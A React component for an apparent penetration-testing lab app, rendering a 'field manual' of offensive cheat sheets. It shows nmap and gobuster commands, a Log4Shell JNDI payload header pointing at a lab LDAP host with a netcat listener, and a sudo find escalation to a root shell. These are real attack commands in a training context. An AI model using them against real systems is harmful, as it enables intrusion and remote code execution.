import React from 'react';
import { BookOpen, Terminal, Shield, Zap, Search } from 'lucide-react';

export const DocumentationPage: React.FC = () => {
  return (
    <div className="h-full overflow-y-auto p-4 space-y-4 font-mono text-xs select-none">
      <div className="flex items-center justify-between border-b border-slate-800 pb-3">
        <div>
          <h1 className="text-base font-bold text-white flex items-center gap-2">
            <BookOpen className="w-5 h-5 text-cyan-400" />
            <span>ROOTRANGE FIELD MANUAL & OFFENSIVE PLAYBOOKS</span>
          </h1>
          <p className="text-slate-400 text-xs mt-0.5">
            Operational reference guides, syntax cheat sheets, and exploitation methodology.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* NMAP REFERENCE */}
        <div className="bg-[#0c1017] border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center space-x-2 text-cyan-400 font-bold border-b border-slate-800 pb-1.5">
            <Search className="w-4 h-4" />
            <span>NMAP PORT & SERVICE ENUMERATION</span>
          </div>
          <p className="text-slate-400 text-xs leading-relaxed">
            Network Mapper is used to discover active hosts and open listening sockets across the range subnet.
          </p>
          <pre className="bg-black/60 p-2.5 rounded border border-slate-800 text-[11px] text-slate-300 overflow-x-auto space-y-1">
            <code># Fast syn scan with scripts and versions{'\n'}nmap -sV -sC -p- 10.10.11.45{'\n\n'}# Aggressive timing with banner grab{'\n'}nmap -A -T4 10.10.11.82</code>
          </pre>
        </div>

        {/* GOBUSTER REFERENCE */}
        <div className="bg-[#0c1017] border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center space-x-2 text-emerald-400 font-bold border-b border-slate-800 pb-1.5">
            <Terminal className="w-4 h-4" />
            <span>GOBUSTER DIRECTORY FUZZING</span>
          </div>
          <p className="text-slate-400 text-xs leading-relaxed">
            Discovers hidden REST endpoints, administrative consoles, and internal backups on web servers.
          </p>
          <pre className="bg-black/60 p-2.5 rounded border border-slate-800 text-[11px] text-slate-300 overflow-x-auto space-y-1">
            <code># Fuzz directories using standard wordlist{'\n'}gobuster dir -u http://10.10.11.45 -w common.txt{'\n\n'}# Discover hidden files by extension{'\n'}gobuster dir -u http://10.10.11.45 -w common.txt -x php,txt,sh</code>
          </pre>
        </div>

        {/* LOG4J MECHANICS */}
        <div className="bg-[#0c1017] border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center space-x-2 text-amber-400 font-bold border-b border-slate-800 pb-1.5">
            <Zap className="w-4 h-4" />
            <span>CVE-2021-44228 LOG4SHELL ANATOMY</span>
          </div>
          <p className="text-slate-400 text-xs leading-relaxed">
            Java Naming and Directory Interface (JNDI) injection enables remote Java class loading from an LDAP server into the JVM.
          </p>
          <pre className="bg-black/60 p-2.5 rounded border border-slate-800 text-[11px] text-slate-300 overflow-x-auto space-y-1">
            <code># JNDI LDAP lookup string header{'\n'}X-Api-Version: {'${jndi:ldap://10.10.14.22:1389/Exploit}'}{'\n\n'}# Listener setup{'\n'}nc -lvnp 4444</code>
          </pre>
        </div>

        {/* GTFOBINS PRIVESC */}
        <div className="bg-[#0c1017] border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="flex items-center space-x-2 text-purple-400 font-bold border-b border-slate-800 pb-1.5">
            <Shield className="w-4 h-4" />
            <span>LINUX SUDO PRIVILEGE ESCALATION</span>
          </div>
          <p className="text-slate-400 text-xs leading-relaxed">
            GTFOBins curated list of Unix binaries that can be exploited by an attacker to bypass security restrictions.
          </p>
          <pre className="bg-black/60 p-2.5 rounded border border-slate-800 text-[11px] text-slate-300 overflow-x-auto space-y-1">
            <code># Check allowed sudo commands{'\n'}sudo -l{'\n\n'}# Exploit find binary with NOPASSWD{'\n'}sudo /usr/bin/find . -exec /bin/sh \; -quit</code>
          </pre>
        </div>
      </div>
    </div>
  );
};
